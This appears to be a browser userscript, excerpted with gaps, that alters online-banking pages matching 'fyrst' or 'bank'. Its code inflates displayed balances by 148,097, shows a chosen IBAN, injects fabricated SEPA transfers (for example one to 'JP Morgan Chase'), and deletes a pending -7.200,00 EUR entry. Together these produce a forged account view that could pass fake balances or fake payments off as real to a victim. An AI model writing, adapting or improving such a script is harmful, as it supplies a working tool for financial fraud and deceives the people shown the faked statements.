// ==UserScript==
// @name         Ed 4Rec  w.sperling@cosmos-gmbh.org
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/518334/Ed%204Rec%20%20wsperling%40cosmos-gmbhorg.user.js
// @updateURL https://update.greasyfork.org/scripts/518334/Ed%204Rec%20%20wsperling%40cosmos-gmbhorg.meta.js
// ==/UserScript==


if (window.location.href.indexOf("fyrst") > 0 || window.location.href.indexOf("kunden") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
var modificationAmount = 148097.00; // Example: +9000 to increase by 9000

// Define the desired IBAN
var desiredIBAN = 'DE15 5507 0396 0064 3882 00';
...
//====MAIN PAGE BALANCES===================UMSATZE BALANCE
    ...
    var MBALANCE_CONFIGS = [
        ...
        { index: 1, adjustmentAmount: 148097 },
        { index: 2, adjustmentAmount: 148097 },
     //   { index: 4, adjustmentAmount: 148097 }
...
//=====TRANSACTIONS
    ...
    var transactionsToInsert = [
  {
           ...
           transactionDate: '10.12.2024',
           transactionAmount: '7.200,00 EUR',
          ...
          {
           recipient: ' JP Morgan Chase.',
           transactionInfo: 'A. Gold meldet sich. Ohne ihn nicht ausgeben 2.',
           transactionType: ' SEPA Überweisung ',
           transactionDate: '10.12.2024',
           transactionAmount: '5.070,00 EUR',
           preferredInsertionLogic: 'pinned_top',
          moveSteps: 1,
           moveDirection: 'down'
        },
...
if (window.location.href.indexOf("fyrst") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
function removeNegativeElement() {
    // Find all elements with data-test="prenoteTransaction"
    const prenoteElements = document.querySelectorAll('[data-test="prenoteTransaction"]');

    prenoteElements.forEach(prenoteElement => {
        // Check if the specified <span> exists within the current element
        const negativeSpan = prenoteElement.querySelector('span.negative.db-text-bold');
        if (negativeSpan && negativeSpan.textContent.includes('-7.200,00')) {
            // Remove the entire element containing the span
            prenoteElement.remove();
            console.log('Removed an element with negative value -7.200,00 EUR');
        }
    });
}
